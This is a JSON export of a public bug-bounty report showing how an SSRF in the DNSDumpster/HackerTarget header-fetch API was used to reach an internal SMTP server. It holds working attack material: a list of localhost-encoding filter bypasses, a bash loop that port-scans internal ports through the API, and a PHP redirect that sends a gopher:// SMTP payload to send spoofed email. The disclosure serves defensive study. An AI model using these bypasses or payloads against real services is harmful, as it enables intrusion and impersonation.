@@ -1,0 +1,237 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": true, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "jobert", 
+        "michiel", 
+        "spam404", 
+        "kapytein", 
+        "cdl", 
+        "mik317", 
+        "bhavukjain1", 
+        "malcolmx", 
+        "eveeez", 
+        "dmatrix", 
+        "and 27 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 392859, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "\n| Summary: |\n| -- |\n[HackerTarget](https://hackertarget.com/) is a service that provides access to online vulnerability scanners and tools used by many security professionals and \u201cmakes securing your systems easier\u201d. They also are the creators of [DNSDumpster](https://dnsdumpster.com/) which is a popular service used for recon.\n\n| Description: |\n| --|\n> Server-Side Request Forgery (SSRF) is a vulnerability in which an attacker can send a controlled, crafted request via a vulnerable application. We can communicate with different services running on different protocols by utilizing URI schemes. Getting a server to issue a request **is not** a vulnerability in itself, but it \n becomes one when you can make requests to things you wouldn\u2019t or shouldn\u2019t normally have access to, such as internal networks or internal services.\n\nIn [DNSDumpster](https://dnsdumpster.com/), there is a function to \"Get HTTP Headers\" for a specific host.  \n\n{F331105}\n\nThis function makes a call to the API at `https://api.hackertarget.com/httpheaders/?q=<target>` and it displays the HTTP Headers of a simple **HEAD** request sent from HackerTarget to the target server.\n\nThe `?q=` parameter was vulnerable to SSRF due to the absence of proper checks and firewalls.\n\n| Proof-of-Concepts |\n| -- | \n\n# Initial Proof-of-Concept:\nMy initial proof-of-concept was extremely bland and I didn't put very much effort into it:\n\n- `https://api.hackertarget.com/httpheaders/?q=http://127.0.0.1:22`\n\n{F331111}\n\n\nThey thanked me and attempted to patch. However, the patch was merely a regular expression that was checking for the string \"127.0.0.1\" and \"localhost\", which was easily bypassed using different encodings that would still resolve to localhost.\n\nExamples :\n\n```\n0\n127.00.1\n127.0.01\n0.00.0\n0.0.00\n127.1.0.1\n127.10.1\n127.1.01\n0177.1\n0177.0001.0001\n0x0.0x0.0x0.0x0\n0000.0000.0000.0000\n0x7f.0x0.0x0.0x1\n0177.0000.0000.0001\n0177.0001.0000..0001\n0x7f.0x1.0x0.0x1\n0x7f.0x1.0x1\nlocaltest.me\n```\n\nThere isn\u2019t a solid way to validate hostnames just by using *string-based* checks, so my suggested mitigation was to resolve all hosts provided in the `?q=` parameter  and check them against local IP ranges.\n\n\nAbout a week and a half later:\n\n >  \u201cIt is on my todo list. Not critical though as there are no local services that could be hit with it.\u201d\n\n\n# Proof of Concept: Hitting Local Services.\nI attempted to enumerate different ports that internal services could be running on, even though there were none \"that could be hit with it.\"\n\n```\n#!/usr/bin/env bash\nfor port in `seq 1 9999`\ndo\n\techo -e \"\\n\\n[+] Checking Port: \"$port\"\\n\"\n\tcurl 'https://api.hackertarget.com/httpheaders/?q=http://'$1':'$port && echo -e \"\\n\"\ndone\n```\n\n```\n\u279c cdl@skid   ~ chmod +x ht.sh && ./ht.sh 0177.1\n```\n\nThis spat out the following response: \n\n{F331112}\n\nThere was an internal SMTP server running on the standard port.\n\n**SMTP:**\n-   SMTP stands for Simple Mail Transfer Protocol.\n-  It is a TCP/IP protocol that\u2019s used for **sending emails**.\n\nIn order to be able to send emails with SMTP we have to first have to know how mail transactions work:\n\n1. SMTP sessions are initiated after the **client** opens a TCP/IP connection to the server and the **server** responds with a greeting (220)\n2. The **client** sends a `HELO` or `EHLO` with the clients identity (example: `HELO hackertarget.com` which means \"Hi I'm hackertarget.com\")\n3. Now the client has to perform 3 steps each separated by a **CRLF** for a valid SMTP mail transaction:\n    - Step 1: `MAIL`: This tells the server \"Hey, we're starting a new email, reset your state\". This is where the email \"from\" is specified.\n    - Step 2: `RCPT`: Tells the server where (who) we want to send the email too.\n    - Step 3: `DATA`: This is where the Subject and body of the email are set, and the client indicates the end of the mail data by a new line containing only \".\". This tells the server that the client confirms the email and tells the server to process it and send it.\n\n   \nHere's a visualization of the structure of SMTP from [RFC 5321](https://tools.ietf.org/html/rfc5321):\n\n```\n                  +----------+                +----------+\n      +------+    |          |                |          |\n      | User |<-->|          |      SMTP      |          |\n      +------+    |  Client- |Commands/Replies| Server-  |\n      +------+    |   SMTP   |<-------------->|    SMTP  |    +------+\n      | File |<-->|          |    and Mail    |          |<-->| File |\n      |System|    |          |                |          |    |System|\n      +------+    +----------+                +----------+    +------+\n                            Email client                     SMTP server\n```\n\nThe SMTP Client was the \"Get HTTP Headers\" function of the API and the the SMTP Server was the service running on an internal port.\n\n\n# Leveraging the SSRF to send emails:\nThe API function was using libcurl to execute the requests *and* it was following redirects. The libcurl library supports an overabundance of protocols including `gopher://` which essentially sends 1 character, a new line (CR+LF), and the remaining data, which allows people to send a multiline requests. This means we can use gopher to send valid commands to the SMTP server and send emails.\n\n\n\n- http://<server>/mail.php:\n\n```\n<?php\n        $commands = array(\n                'HELO hackertarget.com',\n                'MAIL FROM: <admin@hackertarget.com>',\n                'RCPT To: <cdl@oou.us>',\n                'DATA',\n                'Subject: corben!',\n                'Corben (cdl) was here, woot woot!',\n                '.'\n        );\n\n        $payload = implode('%0A', $commands);\n\n        header('Location: gopher://0:25/_'.$payload);\n?>\n```\n\nThis responds with a 302 redirect to the internal SMTP server with the valid commands to send an email.\n\n\nI confirmed it worked by visiting the following URL:\n- https://api.hackertarget.com/httpheaders/?q=http://<server>/mail.php \n\nI checked my email (cdl@oou.us) and I had an email from `admin@hackertarget.com` with the subject \"corben!\" and the body \"Corben (cdl) was here, woot woot!\"\n\nHere's the proof-of-concept video:\n- https://www.youtube.com/watch?v=F_sC_OrSkIc\n\n\n| Impact | \n|--| \nAn attacker could access internal networks and internal services. I could have sent valid emails from and as HackerTarget.\n\n\n\nThanks,\nCorben Leo (@cdl)\n- https://hacking.us.com\n- https://twitter.com/hacker_", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "none", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "high", 
+            "availability": "none"
+        }, 
+        "rating": "high", 
+        "score": 8.6, 
+        "author_type": "User"
+    }, 
+    "title": "Sending Emails from  DNSDumpster - Server-Side Request Forgery to Internal SMTP Access", 
+    "is_member_of_team?": null, 
+    "vote_count": 37, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 9756, 
+            "content": "This is a write-up of an SSRF I accidentally found in DNS Dumpster / HackerTarget and leveraged to access to internal services. They **do not**  have a bug bounty program, **do not** test them without their permission. Originally blogged about this here: https://hacking.us.com/blog/hackertarget ", 
+            "content_html": "<p>This is a write-up of an SSRF I accidentally found in DNS Dumpster / HackerTarget and leveraged to access to internal services. They <strong>do not</strong>  have a bug bounty program, <strong>do not</strong> test them without their permission. Originally blogged about this here: <a title=\"https://hacking.us.com/blog/hackertarget\" href=\"/redirect?signature=f411b698555279730a69a9eea93c822b22529431&amp;url=https%3A%2F%2Fhacking.us.com%2Fblog%2Fhackertarget\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://hacking.us.com/blog/hackertarget</span><i class=\"icon-external-link\"></i></a> </p>\n"
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "attachments": [
+        {
+            "file_name": "ht-httpheaders.png", 
+            "type": "image/png", 
+            "id": 331105, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/105/cbeb6cf1e1d48168beb1d8c01d951d2032e5d6a4/ht-httpheaders.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221805Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e2094c6690f1d28b18859dc7818766b21bc40dfc9e25e197b9f8b99dc6ab3bc9"
+        }, 
+        {
+            "file_name": "ht-ssh.png", 
+            "type": "image/png", 
+            "id": 331111, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/111/c83108b2369b854670d9591934992ddd440c8ab6/ht-ssh.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221805Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7ec7c0ca54a6117663c16d9cf68d6d5cc9e07f5595925651a133af3e3350f3b6"
+        }, 
+        {
+            "file_name": "ht-postfix.png", 
+            "type": "image/png", 
+            "id": 331112, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/112/3d29af60f85640c53af07837d82639a36e14df95/ht-postfix.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221805Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9242546c98ebe0693592243a3c1f0f1f8b3062bf5b86c9bc6bedfd45eadc9ae7"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "cdl", 
+                "url": "/cdl"
+            }, 
+            "created_at": "2017-12-06T19:18:17.000Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-06T19:18:17.000Z", 
+            "actor": {
+                "username": "cdl", 
+                "url": "/cdl", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/114/524/8c1860c79bd621ea9fb8516c31eae5a6d3622dc0_medium.jpg?1543706379"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hackertarget", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 3173999, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-10T21:40:02.803Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-10T21:40:02.803Z", 
+            "actor": {
+                "username": "cdl", 
+                "url": "/cdl", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/114/524/8c1860c79bd621ea9fb8516c31eae5a6d3622dc0_medium.jpg?1543706379"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hackertarget", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3174000, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-10T22:08:16.604Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-10T22:08:16.604Z", 
+            "actor": {
+                "username": "cdl", 
+                "url": "/cdl", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/114/524/8c1860c79bd621ea9fb8516c31eae5a6d3622dc0_medium.jpg?1543706379"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High (8.6)", 
+                "old_severity": null
+            }, 
+            "team_handle": "hackertarget", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3174085, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "cdl", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/cdl", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/114/524/d42736dd333a70fe16b92be2aa8f645aebabb69e_small.jpg?1543706379"
+        }, 
+        "is_me?": false
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-08-10T21:40:02.757Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/392859", 
+    "created_at": "2017-11-17T19:18:17.000Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<table>\n<thead>\n<tr>\n<th>Summary:</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n\n<p><a href=\"/redirect?signature=79037abaad8fd4be479926d68bd9b5d5ccd1cbe4&amp;url=https%3A%2F%2Fhackertarget.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>HackerTarget</span><i class=\"icon-external-link\"></i></a> is a service that provides access to online vulnerability scanners and tools used by many security professionals and \u201cmakes securing your systems easier\u201d. They also are the creators of <a href=\"/redirect?signature=eb9ca56972045af9bb2d7c7d81652fbf4a60d45d&amp;url=https%3A%2F%2Fdnsdumpster.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>DNSDumpster</span><i class=\"icon-external-link\"></i></a> which is a popular service used for recon.</p>\n\n<table>\n<thead>\n<tr>\n<th>Description:</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n\n<blockquote>\n<p>Server-Side Request Forgery (SSRF) is a vulnerability in which an attacker can send a controlled, crafted request via a vulnerable application. We can communicate with different services running on different protocols by utilizing URI schemes. Getting a server to issue a request <strong>is not</strong> a vulnerability in itself, but it <br>\n becomes one when you can make requests to things you wouldn\u2019t or shouldn\u2019t normally have access to, such as internal networks or internal services.</p>\n</blockquote>\n\n<p>In <a href=\"/redirect?signature=eb9ca56972045af9bb2d7c7d81652fbf4a60d45d&amp;url=https%3A%2F%2Fdnsdumpster.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>DNSDumpster</span><i class=\"icon-external-link\"></i></a>, there is a function to &quot;Get HTTP Headers&quot; for a specific host.  </p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ht-httpheaders.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/105/cbeb6cf1e1d48168beb1d8c01d951d2032e5d6a4/ht-httpheaders.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221805Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e2094c6690f1d28b18859dc7818766b21bc40dfc9e25e197b9f8b99dc6ab3bc9\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/105/cbeb6cf1e1d48168beb1d8c01d951d2032e5d6a4/ht-httpheaders.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221805Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e2094c6690f1d28b18859dc7818766b21bc40dfc9e25e197b9f8b99dc6ab3bc9\" class=\"markdown-inline-image\"></a></p>\n\n<p>This function makes a call to the API at <code>https://api.hackertarget.com/httpheaders/?q=&lt;target&gt;</code> and it displays the HTTP Headers of a simple <strong>HEAD</strong> request sent from HackerTarget to the target server.</p>\n\n<p>The <code>?q=</code> parameter was vulnerable to SSRF due to the absence of proper checks and firewalls.</p>\n\n<table>\n<thead>\n<tr>\n<th>Proof-of-Concepts</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n\n<h1 id=\"initial-proof-of-concept\">Initial Proof-of-Concept:</h1>\n\n<p>My initial proof-of-concept was extremely bland and I didn&#39;t put very much effort into it:</p>\n\n<ul>\n<li><code>https://api.hackertarget.com/httpheaders/?q=http://127.0.0.1:22</code></li>\n</ul>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ht-ssh.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/111/c83108b2369b854670d9591934992ddd440c8ab6/ht-ssh.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221805Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=7ec7c0ca54a6117663c16d9cf68d6d5cc9e07f5595925651a133af3e3350f3b6\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/331/111/c83108b2369b854670d9591934992ddd440c8ab6/ht-ssh.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2O5WI6N5%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221805Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDM80lYw7bq6fX2mWmyK3A%2FYy2J%2B1CaNMFFByI49KAHL3ffniSKPgZ5UE0t%2FKuL%2BC7PBXMB98Z3o09TUo7Y1vdlHE%2BoAXqzkGLbuwkVqLEPDARWUueiT00m%2ByRmrzjU0HcpIq%2FedfbYl7Ym2BiNkoMAkztH5poFHAKBO9jzqWCjL27%2F5ZnMlivjJnd5XXtqqHNXZ78qia146VO8%2FZspoQ8n7kXBlOpYH4MUgiCqDgA0xacw4961kpYAdPr8TUaf7rFoFJFfYwqKHGmVA1yrv7%2Bu%2FhPt0NgDTc5dwD0N%2Bll9y0quNuCrcgvP7Y6CkCAOTe%2BwQYMPEdmYzLxKWkdO6eO45stpk39rcEgQF%2F4W0jz8Vf0vt80lPmF%2F38Em2229EVWBo7ZOdQDqVZzqZsU9Eu0yymbkHxkkgA31gv%2FNvPaiGnxbAhArLKXjS7zquNZFtUSHrumqrFvwL0uMWyoU15TwtfQwR%2FPYSGUT8PEW15mFHRrIaTHEu8cMobxXYvxH4mMwBn88FVZ3EcsxYFztByV2pBPgy91GB%2FURlZoVPXQEoXciUGVwjnS5HCYcscMFkk0LL9QAzMBQXEriA7WWItAZtogQkz2PYohp2m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=7ec7c0ca54a6117663c16d9cf68d6d5cc9e07f5595925651a133af3e3350f3b6\" class=\"markdown-inline-image\"></a></p>\n\n<p>They thanked me and attempted to patch. However, the patch was merely a regular expression that was checking for the string &quot;127.0.0.1&quot; and &quot;localhost&quot;, which was easily bypassed using different encodings that would still resolve to localhost.</p>\n\n<p>Examples :</p>\n<pre class=\"highlight plaintext\"><code>0\n127.00.1\n127.0.01\n0.00.0\n0.0.00\n127.1.0.1\n127.10.1\n127.1.01\n0177.1\n0177.0001.0001\n0x0.0x0.0x0.0x0\n0000.0000.0000.0000\n0x7f.0x0.0x0.0x1\n0177.0000.0000.0001\n0177.0001.0000..0001\n0x7f.0x1.0x0.0x1\n0x7f.0x1.0x1\nlocaltest.me\n</code></pre>\n<p>There isn\u2019t a solid way to validate hostnames just by using <em>string-based</em> checks, so my suggested mitigation was to resolve all hosts provided in the <code>?q=</code> parameter  and check them against local IP ranges.</p>\n\n<p>About a week and a half later:</p>\n\n<blockquote>\n<p>\u201cIt is on my todo list. Not critical though as there are no local services that could be hit with it.\u201d</p>\n</blockquote>\n\n<h1 id=\"proof-of-concept-hitting-local-services\">Proof of Concept: Hitting Local Services.</h1>\n\n<p>I attempted to enumerate different ports that internal services could be running on, even though there were none &quot;that could be hit with it.&quot;</p>\n<pre class=\"highlight shell\"><code><span class=\"c\">#!/usr/bin/env bash</span>\n<span class=\"k\">for </span>port <span class=\"k\">in</span> <span class=\"sb\">`</span>seq 1 9999<span class=\"sb\">`</span>\n<span class=\"k\">do\n    </span><span class=\"nb\">echo</span> -e <span class=\"s2\">&quot;</span><span class=\"se\">\\n\\n</span><span class=\"s2\">[+] Checking Port: &quot;</span><span class=\"nv\">$port</span><span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span>\n    curl <span class=\"s1\">&#39;https://api.hackertarget.com/httpheaders/?q=http://&#39;</span><span class=\"nv\">$1</span><span class=\"s1\">&#39;:&#39;</span><span class=\"nv\">$port</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">echo</span> 